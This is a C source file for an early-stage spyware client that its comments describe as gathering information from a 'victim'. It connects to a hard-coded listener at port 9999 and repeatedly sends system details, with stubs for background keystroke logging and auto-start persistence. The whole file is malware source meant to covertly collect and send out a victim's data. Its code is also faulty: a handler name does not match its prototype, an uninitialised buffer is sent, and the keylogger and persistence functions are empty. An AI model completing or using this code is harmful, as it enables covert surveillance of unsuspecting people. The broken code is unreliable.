#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>
//should create ifdef for winsock 

#define TCP SOCK_STREAM
#define SERVER_IP "127.0.0.1"
#define PORT "9999"
#define BUF_MAX 1024
//prototype
void key_stroke_tracker();
void gathering(int);
void auto_start_up();
void sigchld_handler(int);
//maybe I should intepert it 



//need to compile in windows to actually run 
int main(void){
    //should gather infomation from the victim 
    int clientfd;
    struct addrinfo hints, *result,*fp;
    int n;


    memset(&hints,0,sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM; //should we use TCP or UDP
    hints.ai_flags = AI_PASSIVE; //should client use this.
    sigchld_handler(SIGCHLD);
    if ((n = getaddrinfo(SERVER_IP, PORT, &hints, &result))< 0){ //the host server
        //or should I try to retry it or make it do something else
        exit(EXIT_FAILURE);
    }

    if((clientfd = socket(result->ai_family, result->ai_socktype, result->ai_flags))< 0){
        exit(EXIT_FAILURE);
    }

    if(connect(clientfd, result->ai_addr, result->ai_addrlen) <0){
        exit(EXIT_FAILURE);
    }
    //this is should take user key stroke in background
    while(1){
        
        gathering(clientfd);
        //gather information 
        //track keystroke
        //using 2 process to send 

    }

    return EXIT_SUCCESS;
}
//gather information

void gathering(int clienfd){
    char *datetime = __DATE__;
    char *operating_system;
    char victimInformation[BUF_MAX] = {0};
    //gather the operating sytem information
    //for apple
    #ifdef __APPLE__
    system("uname -a &"); //for running in the background 
    //need to handle the blocking on this thing
    send(clienfd, operating_system, BUF_MAX,0);
    #endif
    //for linux
    #ifdef __linux__
    operating_system = "Linux machine, might careful";
    send(clienfd, operating_system, sizeof victimInformation,0);

    #endif
}
void sigchild_handler(int signum){
    int save_errno= errno;
    while(waitpid(-1,NULL,WNOHANG)>0);

    errno = save_errno;
}

//how to reconize the keyboard devices
void key_stroke_tracker(){
    //should we use getchar and make it running on the back ground.
    //this should the 

    getchar();
}


void auto_start_up(){

}
